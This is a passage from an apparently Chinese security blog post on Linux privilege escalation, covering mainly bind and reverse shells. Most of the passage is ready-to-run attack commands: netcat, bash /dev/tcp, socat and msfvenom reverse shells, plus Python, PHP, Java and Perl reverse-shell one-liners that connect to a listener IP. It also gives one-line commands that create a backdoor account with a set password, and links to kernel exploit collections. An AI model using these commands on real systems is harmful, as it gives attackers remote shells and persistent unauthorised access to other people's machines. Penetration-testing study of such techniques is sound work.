  -<span class="hljs-keyword">z</span>, --zero                 zero-I/O <span class="hljs-keyword">mode</span> (used <span class="hljs-keyword">for</span> scanning)
Remote port <span class="hljs-keyword">number</span> can also <span class="hljs-keyword">be</span> specified <span class="hljs-keyword">as</span> <span class="hljs-built_in">range</span>.  Example: <span class="hljs-string">&#x27;1-1024&#x27;</span></code></pre>

<p>目标开启本地监听并将本地的bash发布出去：<code>nc -lvvp 8080 -t -e /bin/bash</code></p>
<p>攻击机直连目标获得root权限：<code>nc target-ip 8080</code></p>
<h3 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2.反向连接"></a>2.反向连接</h3><p>目标为内网主机，没有公网ip，无法被外网直接访问，但是可以出网，我们可以让目标访问外网。方法很多，介绍几种常见的方法，和windows差不多。</p>
<h4 id="1-bash直接反弹"><a href="#1-bash直接反弹" class="headerlink" title="1.bash直接反弹"></a>1.bash直接反弹</h4><p>一句话直接反弹：<code>bash -i &gt;&amp; /dev/tcp/target-ip/8080 0&gt;&amp;1</code></p>
<p><strong>解释</strong>：</p>
<p><code>bash -i </code>：产生一个bash交互环境</p>
<p><code>&gt;&amp;</code>：将联合符号的内容与后面相结合然后一起重定向给后者</p>
<p><code>/dev/tcp/target-ip/8080</code>：linux环境中所有内容均以文件形式存在，让主机与目标主机<code>target-ip/port</code>建立一个tcp连接</p>
<p><code>0&gt;&amp;1</code>：将标准输入与输出相结合，然后重定向给前面标准输出的内容</p>
<p>总结：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h4 id="2-nc反弹"><a href="#2-nc反弹" class="headerlink" title="2.nc反弹"></a>2.nc反弹</h4><p>linux自带的nc无法反弹一个bash给远端，需要手动上传一个或者下载一个nc，但是nc反弹的shell交互性比较差。</p>
<p>攻击机开启监听：<code>nc -lvvp 8080</code></p>
<p>目标机：<code>nc server-ip 8080 -t -e /bin/bash</code></p>
<h4 id="3-socat反弹"><a href="#3-socat反弹" class="headerlink" title="3.socat反弹"></a>3.socat反弹</h4><p>nc的加强版</p>
<p>攻击机开启监听：<code>socat TCP-LISTEN:12345 -</code></p>
<p>目标机：<code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:server-ip：12345</code></p>
<h4 id="4-msf反弹"><a href="#4-msf反弹" class="headerlink" title="4.msf反弹"></a>4.msf反弹</h4><p>列出支持的cmd模块（支持python、perl、bash、netcat等）：</p>
<pre><code class="hljs shell">msf5 &gt; msfvenom -l payloads |grep &quot;cmd/unix/reverse&quot;
[*] exec: msfvenom -l payloads |grep &quot;cmd/unix/reverse&quot;

    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.
    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.
    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.
    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.
    cmd/unix/reverse_lua                                Creates an interactive shell via Lua
    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode
    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat
    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat
    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs
    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections
    cmd/unix/reverse_perl                               Creates an interactive shell via perl
    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL
    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
    cmd/unix/reverse_python                             Connect back and create a command shell via Python
    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    cmd/unix/reverse_r                                  Connect back and create a command shell via R
    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL
    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat
    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option
    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)
    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default.
msf5 &gt;</code></pre>

<p>选择对应的payload生成一句话木马(参数R可要可不要)</p>
<pre><code class="hljs shell">msf5 &gt; msfvenom -p cmd/unix/reverse_ncat_ssl lhost=192.168.5.1 lport=1234 R
[*] exec: msfvenom -p cmd/unix/reverse_ncat_ssl lhost=192.168.5.1 lport=1234 R

[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 38 bytes
ncat -e /bin/sh --ssl 192.168.5.1 1234s</code></pre>

<p>攻击机开启监听：<code>nc -lvvp 1234</code></p>
<p>目标执行一句话木马：<code>ncat -e /bin/sh --ssl 192.168.5.1 1234s</code></p>
<h4 id="5-脚本语言一句话反弹"><a href="#5-脚本语言一句话反弹" class="headerlink" title="5.脚本语言一句话反弹"></a>5.脚本语言一句话反弹</h4><p><strong>python</strong>：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.31.41&quot;</span>,<span class="hljs-number">8080</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;</code></pre>

<p><strong>php</strong>：</p>
<pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;192.168.31.41&quot;</span>,<span class="hljs-number">8080</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</code></pre>

<p><strong>java</strong>：</p>
<pre><code class="hljs dart">r = Runtime.getRuntime()
p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do <span class="hljs-subst">$line</span> 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>[])
p.waitFor()</code></pre>

<p><strong>perl</strong>：</p>
<pre><code class="hljs tcl">perl -e &#x27;use Socket;$i=<span class="hljs-string">&quot;192.168.31.41&quot;</span>;$p=<span class="hljs-number">8080</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</code></pre>

<p>网络上还有其他各种脚本，没有好坏之分，主要是看效果啦</p>
<h3 id="3-解决交互性差-甚至没有"><a href="#3-解决交互性差-甚至没有" class="headerlink" title="3.解决交互性差(甚至没有)"></a>3.解决交互性差(甚至没有)</h3><p>问题1： 获取的虚拟终端没有交互性，我们想给添加的账号设置密码，无法完成。 </p>
<p><strong>问题2</strong>：标准的错误输出无法显示，无法正常使用vim等文本编辑器等； </p>
<p>问题3： 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p>
<p>为了解决上述问题，有以下一些解决方案</p>
<h4 id="1-一句话添加账号"><a href="#1-一句话添加账号" class="headerlink" title="1.一句话添加账号"></a>1.一句话添加账号</h4><h5 id="1-chpassed"><a href="#1-chpassed" class="headerlink" title="1.chpassed"></a>1.chpassed</h5><p>在反弹的shell中执行语句：<code>useradd newuser;echo &quot;newuser:password&quot;|chpasswd</code></p>
<h5 id="2-useradd-p"><a href="#2-useradd-p" class="headerlink" title="2.useradd -p"></a>2.useradd -p</h5><p>在反弹的shell中执行语句：<code>useradd -p encrypted_password newuser</code></p>
<h5 id="3-echo-e"><a href="#3-echo-e" class="headerlink" title="3.echo -e"></a>3.echo -e</h5><p>在反弹的shell中执行语句：<code>useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</code></p>
<h4 id="2-python-标准虚拟终端获取"><a href="#2-python-标准虚拟终端获取" class="headerlink" title="2.python 标准虚拟终端获取"></a>2.python 标准虚拟终端获取</h4><p>使用python 一句话获取标准shell:<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/176255.html">https://www.freebuf.com/articles/system/176255.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackliu.com/?p=426">https://www.hackliu.com/?p=426</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45116657/article/details/103176461">https://blog.csdn.net/weixin_45116657/article/details/103176461</a></p>
<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/19/1122/23/25947829_874875535.shtml">http://www.360doc.com/content/19/1122/23/25947829_874875535.shtml</a></p>
<p>一些工具及资源地址：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/bonsaiviking/NfSpy">https://github.com/bonsaiviking/NfSpy</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83/">密码相关操作进行提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-corn%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83/">计划任务 corn进行提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">内核漏洞提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%88%A9%E7%94%A8root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/">利用root权限运行的服务提权</a>
                    
                      <a class="hover-with-bg" href="/tags/sudo%E6%8F%90%E6%9D%83/">sudo提权</a>
                    
                      <a class="hover-with-bg" href="/tags/suid%E6%8F%90%E6%9D%83/">suid提权    </a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%88%A9%E7%94%A8%E5%8F%AF%E5%86%99%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83/">利用可写文件提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83/">劫持环境变量提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/">网络与隐藏服务提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83/">通配符注入提权</a>
                    
                      <a class="hover-with-bg" href="/tags/NFS%E5%BC%B1%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83/">NFS弱权限提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E8%B7%AF%E5%BE%84%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83/">'.'路径配置错误提权</a>
                    
                      <a class="hover-with-bg" href="/tags/mysql-udf%E6%8F%90%E6%9D%83/">mysql udf提权</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
                    
                      <a class="hover-with-bg" href="/tags/%E6%95%8F%E6%84%9F%E7%BB%84%E6%8F%90%E6%9D%83-docker/">敏感组提权(docker)</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/11/30/bypass/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">bypass</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/10/01/windows%E6%8F%90%E6%9D%83/">
                        <span class="hidden-mobile">windows提权</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <!-- <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div> -->
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "linux提权(user->root)&nbsp;",
      ],
      cursorChar: "",
      typeSpeed: 100,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>







  
  
    <script>
      !function (e, t, a) {
        function r() {
          for (var e = 0; e < s.length; e++) s[e].alpha <= 0 ? (t.body.removeChild(s[e].el), s.splice(e, 1)) : (s[e].y--, s[e].scale += .004, s[e].alpha -= .013, s[e].el.style.cssText = "left:" + s[e].x + "px;top:" + s[e].y + "px;opacity:" + s[e].alpha + ";transform:scale(" + s[e].scale + "," + s[e].scale + ") rotate(45deg);background:" + s[e].color + ";z-index:99999");
          requestAnimationFrame(r)
        }

        function n() {
          var t = "function" == typeof e.onclick && e.onclick;
          e.onclick = function (e) {
            t && t(), o(e)
          }
        }

        function o(e) {
          var a = t.createElement("div");
          a.className = "heart", s.push({
            el: a,
            x: e.clientX - 5,
            y: e.clientY - 5,
            scale: 1,
            alpha: 1,
            color: c()
          }), t.body.appendChild(a)
        }

        function i(e) {
          var a = t.createElement("style");
          a.type = "text/css";
          try {
            a.appendChild(t.createTextNode(e))
          } catch (t) {
            a.styleSheet.cssText = e
          }
          t.getElementsByTagName("head")[0].appendChild(a)
        }

        function c() {
          return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
        }

        var s = [];
        e.requestAnimationFrame = e.requestAnimationFrame || e.webkitRequestAnimationFrame || e.mozRequestAnimationFrame || e.oRequestAnimationFrame || e.msRequestAnimationFrame || function (e) {
          setTimeout(e, 1e3 / 60)
        }, i(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"), n(), r()
      }(window, document);
    </script>
  














</body>
</html>
